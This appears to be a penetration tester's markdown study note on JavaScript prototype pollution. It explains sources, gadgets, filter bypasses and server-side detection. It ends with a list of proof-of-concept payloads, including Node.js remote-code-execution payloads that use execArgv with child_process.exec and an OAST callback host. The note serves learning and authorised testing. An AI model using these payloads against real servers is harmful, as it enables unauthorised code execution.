# Prototype Pollution
So you know about object oriented programming with inheritance and stuff right. Now this in javascript. The parent object is called the prototype, and can be accessed by `foo.__proto__`. If an object does not inherit specifically from another object, the prototype is defaulted to `Object.prototype`. So if you can inject a property to this default prototype, all other objects (with this prototype) will inherit the property.

Prototype pollution relies on three things
- A source to inject arbitrary properties
- A gadget that uses an `Object.prototype` property somewhere in the code
- A sink like `eval()` or `.innerHTML` that allows for code execution

## Client-Side

### Source
Steps to search for client-side prototype pollution sources.
1. Try to inject an arbitrary property via the query string, URL fragment, and any JSON input. For example `vulnerable-website.com/?__proto__[foo]=bar`.
2. In the browser console, inspect `Object.prototype` to see if it is successfully polluted.
3. Try using different techniques, or different notation. For example `vulnerable-website.com/?__proto__.foo=bar`.
4. Repeat this for every potential source.

Just use [DOM Invader](../burp/dom_invader.md), which is preinstalled in Burps browser. It automatically tests for prototype pollution soources when you browse.

### Gadget
> I was going to write a step by step instruction on how to find prototype pollution gadgets here. But then I saw that [DOM Invader](../burp/dom_invader.md) can also do this automatically. This saves a lot of time. If you still want to read how to do it manually, this is the [link](https://portswigger.net/web-security/learning-paths/prototype-pollution/client-side-prototype-pollution/prototype-pollution/client-side/finding-client-side-prototype-pollution-gadgets-manually).

### Via Constructor
Instead of using `someObject.__proto__` you can use `someObject.constructor.prototype`, these two essentially return the same prototype. This can be used when "\_\_proto__" is stripped from user input or something. If "\_\_proto__" is stripped, but not recursively, you can also try to use `__pro__proto__to__` as the key.

### Browser API
If the client side code uses `fetch()` in an unsafe way, and prototype pollution is possible. It might be possible to inject malicious headers or a malicious body. With `Object.prototype.headers.someheader=somevalue` or `Object.prototype.body=somevalue`.

If developers have tried to block prototype pollution with `Object.defineProperty(vulnobj, 'prop', {configurable: false, writable: false})`, but no value is set for the property, pollution might still be possible since this function takes a `value` property to set the property to. So just pollute the `Object.prototype.value`, but tbh this is really low hanging fruit that is just stupid.

## Server-Side
Nowadays, javascript is also widely used on the server-side of applications. This allows for this vulnerability to also happen on the server. But searching for server-side prototype pollution is way harder than client-side. Since you have no source code, no devtools, and every change persists until the whole server resets.

### Reflection
Luckily, for-loops that iterate over properties of an object, or over items in an array, also loop over inherited properties. This may result in reflection of a polluted prototype property. 

### No Reflection
When you don't get properties reflected back. Life sucks. You can try injecting certain configuration options of the server. This might change its behaviour without crashing the whole thing. These are some good examples:
- Status code override
> NodeJS' create error function uses this line `status = err.status || err.statusCode || status` to get the statuscode for the embedded json in the response body. Try injecting a number 400-599 in the `status` property.
- JSON spaces override
> The Express framework (vulnerable < 4.17.4) has a `json spaces` option. Try polluting it, and request any json from the server.
- Charset override
> Express servers often implement so-called "middleware" modules that enable preprocessing of requests before they're passed to the appropriate handler function. If you can pollute the `content-type` property with `application/json; charset=utf-7`, an UTF-7 encoded string "+AGYAbwBv-" will be reflected as "foo".

### BApp
Just use the Burp Suite BApp, is way easier. [Server-Side Prototype Pollution Scanner](../burp/ss_protopoll_scan.md).

## Exploit
Here are some proof of concepts to get remote code execution on NodeJS servers.

# Proof Of Concepts


### URL Query
```url
/?__proto__[foo]=bar
```
```url
/?__proto__.foo=bar
```

### URL Fragment
```url
/#__proto__[foo]=bar
```
```url
/#__proto__.foo=bar
```

### Constructor
Instead of `__proto__` kinda.

```
constructor[prototype][foo]=bar
```
```
constructor.prototype.foo=bar
```

### JSON Format
```json
"__proto__": {
    "foo":"bar"
}
```

### RCE
```json
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=OAST.tocheckifworks.com"
}
```
```json
"__proto__": {
    "execArgv": [
        "--eval=require('child_process').exec('shellcode here')"
    ]
}
```

If the application already executes its own `child_process.execSync()` or `child_process.exec()`, you can try injecting options that may be left undefined:
```json
"__proto__": {
    "shell":"vim",
    "input":":! <command>\n"
}
```

# Sources
- Main info (Portswigger): https://portswigger.net/web-security/learning-paths/prototype-pollution